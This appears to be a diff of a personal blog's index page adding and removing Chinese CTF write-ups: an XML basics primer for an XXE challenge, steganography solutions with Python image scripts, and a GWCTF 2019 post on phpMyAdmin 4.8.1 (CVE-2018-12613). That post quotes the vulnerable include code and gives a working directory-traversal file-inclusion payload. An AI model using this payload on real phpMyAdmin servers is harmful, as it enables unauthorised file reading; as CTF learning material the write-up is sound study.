@@ -71,6 +71,101 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-63" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/08/page-63/" class="article-date">
+  <time class="dt-published" datetime="2021-07-08T06:52:05.000Z" itemprop="datePublished">2021-07-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/08/page-63/">NCTF2019fakeXMLcookbook</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>看到题目名字XML，XXE漏洞<br>XML<br>什么是 XML？<br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签。<br>XML基本格式与基本语法<br>基本格式：</p>
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!--xml文件的声明-->
+<p><bookstore>                                                 <!--根元素--><br><book category="COOKING">        <!--bookstore的子元素，category为属性--></p>
+<title>Everyday Italian</title>           <!--book的子元素，lang为属性-->
+<author>Giada De Laurentiis</author>                  <!--book的子元素-->
+<year>2005</year>                                     <!--book的子元素-->
+<price>30.00</price>                                  <!--book的子元素-->
+</book>                                                 <!--book的结束-->
+</bookstore>                                       <!--bookstore的结束-->
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。   
+基本语法：
+
+<p>所有 XML 元素都须有关闭标签。<br>XML 标签对大小写敏感。<br>XML 必须正确地嵌套。<br>XML 文档必须有根元素。<br>XML 的属性值须加引号。<br>若多个字符都需要转义，则可以将这些内容存放到CDATA里面</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/5.PNG?raw=true" alt="5.PNG"></p>
+<p>XML的设计宗旨是<strong>传输数据</strong>，而非显示数据。<br>XML注入前提条件<br>（1）用户能够控制数据的输入<br>（2）程序有拼凑的数据</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/6.PNG?raw=true" alt="6.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/08/page-63/" data-id="cksyl7wjs001iw4w7ar2ycrzo" data-title="NCTF2019fakeXMLcookbook" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-62" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/08/page-62/" class="article-date">
+  <time class="dt-published" datetime="2021-07-08T06:52:03.000Z" itemprop="datePublished">2021-07-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/08/page-62/">GWCTF 2019我有一个数据库  1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>还挺大胆直接告诉人你有一个<strong>数据库 url后/phpmyadmin 跳到php后台了</strong><br>然后看这版本4.8.1 <strong>有个漏洞叫（CVE-2018-12613）</strong> 可以远程文件包含漏洞<br>$target_blacklist = array (<br>    ‘import.php’, ‘export.php’<br>);</p>
+<p>// If we have a valid target, let’s load that script instead<br>if (! empty($_REQUEST[‘target’])<br>    &amp;&amp; is_string($_REQUEST[‘target’])<br>    &amp;&amp; ! preg_match(‘/^index/‘, $_REQUEST[‘target’])<br>    &amp;&amp; ! in_array($_REQUEST[‘target’], $target_blacklist)<br>    &amp;&amp; Core::checkPageValidity($_REQUEST[‘target’])<br>) {<br>    include $_REQUEST[‘target’];<br>    exit;<br>}<br>满足5个条件后就会include$_REQUEST[‘target’]的内容</p>
+<p>$_REQUEST[‘target’]不为空<br>$_REQUEST[‘target’]是字符串<br>$_REQUEST[‘target’]不以index开头<br>$_REQUEST[‘target’]不在$target_blacklist中 ‘import.php’, ‘export.php’<br>然后接下去的原理就看不懂了<br>任意文件包含<br>通过目录穿越包含任意文件 ?target=db_datadict.php%253f/../../../../../../../../../Windows/DATE.ini   这波这个payload就可以直接用了<br>?target=db_datadict.php%253f/../../../../../../../../../flag   /../ 这个慢慢加加到出现flag即可</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/08/page-62/" data-id="cksyl7wjr001hw4w73el79u3h" data-title="GWCTF 2019我有一个数据库  1" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-61" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/07/08/page-61/" class="article-date">
@@ -602,106 +697,6 @@ if(isset($_GET['exp'])){       ；典型的木马get方式
 
 
   
-    <article id="post-page-53" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/05/27/page-53/" class="article-date">
-  <time class="dt-published" datetime="2021-05-27T06:59:00.000Z" itemprop="datePublished">2021-05-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/27/page-53/">那啥ciscn2021杂项的running pixel</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>奔跑的像素点蛤？</p>
-<p>跑？ 把所有的帧给提取出来</p>
-<p>丢Stegsolve 里头看了看 red plane3 看了看 都有一个点比较另类的</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/aaa.jpg?raw=true" alt="aaa.jpg"><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/ccc.jpg?raw=true" alt="ccc.jpg"></p>
-<p>然后ps看这个点的像素值总会含有这个RGB: 233,233,233的像素块  部分像素颜色为233，233，233将颜色为233，233，233区块的位置尝试画出来 </p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/ddd.jpg?raw=true" alt="ddd.jpg"></p>
-<p>from PIL import Image</p>
-<p>flag_img = Image.new(‘1’,(400,400))<br>#mode=1 1位黑白像素，每字节存储一个像素<br>for name in range(10,383):    #这边应给得从1开始<br>    framepic = Image.open(‘0_f’+str(name)+’.gif’)   #然后这边0_f0 应该为这样 跑完前十张图后改称这样<br>    framepic = framepic.convert(“RGB”)<br>    width,height = framepic.size<br>    for w in range(width):<br>        for h in range(height):<br>            if framepic.getpixel((w,h)) == (233,233,233):<br>                flag_img.putpixel((h,w),1)</p>
-<p>flag_img.save(‘./flag/‘+str(name)+’.png’)     （从别的大佬那拿来的脚本）</p>
-<p>和刚才的所有的导出的帧数放在同一个文件夹 跑完程序就<img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/bbb.jpg?raw=true" alt="bbb.jpg">可以了  </p>
-<p>得到这张图慢慢拼图就能拿到flag了</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/27/page-53/" data-id="cksyl7wjm0019w4w75di8f9a5" data-title="那啥ciscn2021杂项的running pixel" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-52" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/05/27/page-52/" class="article-date">
-  <time class="dt-published" datetime="2021-05-27T05:15:22.000Z" itemprop="datePublished">2021-05-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/27/page-52/">ciscn robot</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>其实包里面给了这么多东西就只有那个抓包文件有用 其他的不会用</p>
-<p>.pcapng那个文件里面Value.[62,49,0] 有好多这种样子的总共<img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/sss.PNG?raw=true" alt="sss.PNG"></p>
-<p>这么多个可以试着把这些点抓出来然后python画图一下</p>
-<p>这个先另存txt先</p>
-<p>from PIL import Image<br>import re</p>
-<p>reg = re.compile(r’Value.[(\d+),(\d+),(\d+)]‘)  ;正则匹配符合的项</p>
-<p>with open(‘ro.txt’,’r’) as f:<br>data = reg.findall(f.read())<br># print(data)<br># print(len(data))</p>
-<p>img = Image.new(‘1’, (400, 400))<br>for i in data:<br>xy = (int(i[0]), int(i[1]))<br>img.putpixel(xy, 1)<br>img.save(“md5flag.png”)</p>
-<p>这边ro.txt 和MD5flag.png 自己命名去</p>
-<p>运行一下可以生成图片</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/md5flag.png?raw=true" alt="md5flag.png"></p>
-<p>然后图片内容MD5加密一下就是flag</p>
-<p>但这可能不是预期解法就是了</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/27/page-52/" data-id="cksyl7wjl0018w4w7fvkk5dwd" data-title="ciscn robot" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -738,6 +733,14 @@ if(isset($_GET['exp'])){       ；典型的木马get方式
       <ul>
         
           <li>
+            <a href="/2021/09/22/page-118/">长城杯flag保熟</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/22/page-117/">第五空间misc</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/19/page-116/">第五空间WEBFTP pklovecloud</a>
           </li>
         
@@ -747,14 +750,6 @@ if(isset($_GET['exp'])){       ；典型的木马get方式
         
           <li>
             <a href="/2021/09/09/page-114/">page</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-110/">一大堆的misc 很大一堆</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-109/">网鼎杯 2020 白虎组PicDown</a>
           </li>
         
       </ul>
